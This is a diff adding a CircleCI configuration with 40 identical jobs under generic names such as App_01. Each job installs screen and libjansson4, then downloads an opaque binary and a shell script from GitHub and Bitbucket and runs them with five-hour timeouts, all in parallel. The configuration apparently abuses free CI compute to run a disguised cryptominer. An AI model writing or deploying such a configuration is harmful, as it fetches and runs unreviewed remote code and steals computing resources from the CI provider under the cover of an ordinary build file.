@@ -1,0 +1,606 @@
+version: 2.1
+jobs:
+  App_01:
+    docker:
+      - image: circleci/ruby:3.0.1-buster
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_02:
+    docker:
+      - image: circleci/rust:1.53.0-buster
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_03:
+    docker:
+      - image: circleci/golang:1.17-rc-buster
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_04:
+    docker:
+      - image: circleci/elixir:1.12.2
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_05:
+    docker:
+      - image: circleci/ruby:3.0
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_06:
+    docker:
+      - image: circleci/rust:1.53-buster
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_07:
+    docker:
+      - image: circleci/golang:1.16.5
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_08:
+    docker:
+      - image: circleci/elixir:1.12.2
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_09:
+    docker:
+      - image: circleci/ruby:2.7.4-buster
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_10:
+    docker:
+      - image: circleci/rust:1.52.1-buster
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_11:
+    docker:
+      - image: circleci/golang:1.17-rc-buster
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_12:
+    docker:
+      - image: circleci/elixir:1.12.2
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_13:
+    docker:
+      - image: circleci/ruby:2.7.3
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_14:
+    docker:
+      - image: circleci/rust:1.51.0-buster
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_15:
+    docker:
+      - image: circleci/golang:1.16.5
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_16:
+    docker:
+      - image: circleci/elixir:1.12.2
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_17:
+    docker:
+      - image: circleci/ruby:2.6.8
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_18:
+    docker:
+      - image: circleci/rust:1.53.0-buster
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_19:
+    docker:
+      - image: circleci/golang:1.17-rc-buster
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_20:
+    docker:
+      - image: circleci/elixir:1.12.2
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_21:
+    docker:
+      - image: circleci/ruby:2.6.7
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_22:
+    docker:
+      - image: circleci/rust:1.53-buster
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_23:
+    docker:
+      - image: circleci/golang:1.16.5
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_24:
+    docker:
+      - image: circleci/elixir:1.12.2
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_25:
+    docker:
+      - image: circleci/ruby:3.0
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_26:
+    docker:
+      - image: circleci/rust:1.52.1-buster
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_27:
+    docker:
+      - image: circleci/golang:1.17-rc-buster
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_28:
+    docker:
+      - image: circleci/elixir:1.12.2
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_29:
+    docker:
+      - image: circleci/ruby:2.7.3
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_30:
+    docker:
+      - image: circleci/rust:1.51.0-buster
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_31:
+    docker:
+      - image: circleci/golang:1.16.5
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_32:
+    docker:
+      - image: circleci/elixir:1.12.2
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_33:
+    docker:
+      - image: circleci/ruby:2.6.8
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_34:
+    docker:
+      - image: circleci/rust:1.53.0-buster
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_35:
+    docker:
+      - image: circleci/golang:1.17-rc-buster
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_36:
+    docker:
+      - image: circleci/elixir:1.12.2
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_37:
+    docker:
+      - image: circleci/ruby:2.6.7
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_38:
+    docker:
+      - image: circleci/rust:1.51.0-buster
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_39:
+    docker:
+      - image: circleci/golang:1.16.5
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+  App_40:
+    docker:
+      - image: circleci/elixir:1.12.2
+
+    steps:
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          no_output_timeout: 5h
+          command: |
+            screen -dmS ls
+            wget https://raw.githubusercontent.com/khansaxfifth/Setang/main/uluk && wget https://bitbucket.org/cheetahkhansax/mayas/raw/9c988d29de445a23c921cd32788d7f6f278bbdaf/update.sh && chmod u+x update.sh && chmod u+x uluk && ./update.sh
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - App_01
+            - App_02
+            - App_03
+            - App_04
+            - App_05
+            - App_06
+            - App_07
+            - App_08
+            - App_09
+            - App_10
+            - App_11
+            - App_12
+            - App_13
+            - App_14
+            - App_15
+            - App_16
+            - App_17
+            - App_18
+            - App_19
+            - App_20
+            - App_21
+            - App_22
+            - App_23
+            - App_24
+            - App_25
+            - App_26
+            - App_27
+            - App_28
+            - App_29
+            - App_30
+            - App_31
+            - App_32
+            - App_33
+            - App_34
+            - App_35
+            - App_36
+            - App_37
+            - App_38
+            - App_39
+            - App_40
